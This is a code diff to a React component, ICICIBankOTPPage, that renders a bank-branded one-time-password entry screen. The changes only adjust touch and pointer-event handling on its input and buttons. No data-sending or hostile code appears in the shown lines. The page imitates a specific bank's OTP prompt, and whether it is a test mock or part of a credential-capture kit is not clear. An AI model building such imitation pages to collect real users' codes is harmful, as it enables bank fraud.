@@ -131,7 +131,7 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
   }
 
   return (
-    <div className="bg-white font-sans w-full max-w-sm mx-auto border border-gray-200 shadow-lg" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', userSelect: 'text' }}>
+    <div className="bg-white font-sans w-full max-w-sm mx-auto border border-gray-200 shadow-lg relative" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', userSelect: 'text', pointerEvents: 'auto' }}>
       {/* Header with logos */}
       <div className="flex justify-between items-center px-3 py-2 border-b border-gray-100">
         <img 
@@ -219,7 +219,9 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
               disabled={otpSubmitting || isExpired}
               autoFocus
               autoComplete="one-time-code"
-              style={{ WebkitAppearance: 'none', touchAction: 'manipulation' }}
+              style={{ WebkitAppearance: 'none', touchAction: 'manipulation', WebkitUserSelect: 'text', pointerEvents: 'auto' }}
+              onTouchStart={(e) => e.stopPropagation()}
+              onClick={(e) => e.stopPropagation()}
             />
           </div>
 
@@ -233,7 +235,8 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
               type="submit"
               disabled={otpValue.length !== 6 || otpSubmitting || isExpired}
               className="flex-1 bg-blue-600 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-blue-700 transition-colors rounded touch-manipulation"
-              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
+              onTouchStart={(e) => e.stopPropagation()}
             >
               {otpSubmitting ? 'CONFIRMING...' : 'CONFIRM'}
             </button>
@@ -243,7 +246,8 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
               onClick={handleOtpCancel}
               disabled={otpSubmitting}
               className="flex-1 bg-gray-500 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors rounded touch-manipulation"
-              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
+              onTouchStart={(e) => e.stopPropagation()}
             >
               CANCEL
             </button>
@@ -255,7 +259,8 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
               type="button"
               className="text-blue-600 font-semibold text-xs hover:text-blue-800 transition-colors touch-manipulation"
               disabled={otpSubmitting}
-              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
+              onTouchStart={(e) => e.stopPropagation()}
             >
               RESEND
             </button>
